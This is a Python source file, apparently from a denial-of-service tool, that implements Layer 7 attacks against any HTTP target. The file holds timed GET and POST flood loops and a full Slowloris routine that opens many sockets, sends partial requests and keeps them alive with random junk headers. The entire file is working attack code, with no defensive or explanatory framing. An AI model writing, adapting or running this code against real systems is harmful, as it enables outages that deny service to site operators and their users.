"""Layer 7 Denial of Service attacks."""

from scapy.all import logging
import time as timing
import requests
import json
import random
import socket
from src.globals import SOCKET_COUNT


class Layer7:
    @staticmethod
    def http_get_flood(target: str, time: int):
        end_t = timing.time() + time
        while (timing.time() < end_t):
            res = requests.get("https://" + target)

    @staticmethod
    def http_post_flood(target: str, time: int, payload: str):
        end_t = timing.time() + time
        payload = json.loads(payload)
        while (timing.time() < end_t):
            requests.post("https://" + target, data=json.dumps(payload))

    @staticmethod
    def __send_header(name, value, socket):
        Layer7.__send_line(f"{name}: {value}", socket)

    def __send_line(line, socket):
        line = f"{line}\r\n"
        socket.send(line.encode("utf-8"))

    @staticmethod
    def __init_socket(target, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        Layer7.__send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1", s)
        ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
        Layer7.__send_header("User-Agent", ua, s)
        Layer7.__send_header("Accept-language", "en-US,en,q=0.5", s)
        return s

    @staticmethod
    def slow_loris(target, port, time):
        list_of_sockets = []
        end_t = timing.time() + time

        for _ in range(SOCKET_COUNT):
            try:
                s = Layer7.__init_socket(target, port)
            except socket.error as e:
                logging.debug(e)
                break
            list_of_sockets.append(s)

        while timing.time() < end_t:
            try:
                for s in list(list_of_sockets):
                    try:
                        Layer7.__send_header("X-a", random.randint(1, 5000), s)
                    except socket.error:
                        list_of_sockets.remove(s)

                for _ in range(SOCKET_COUNT - len(list_of_sockets)):
                    try:
                        s = Layer7.__init_socket(target, port)
                        if s:
                            list_of_sockets.append(s)
                    except socket.error as e:
                        break
                timing.sleep(15)

            except (KeyboardInterrupt, SystemExit):
                break
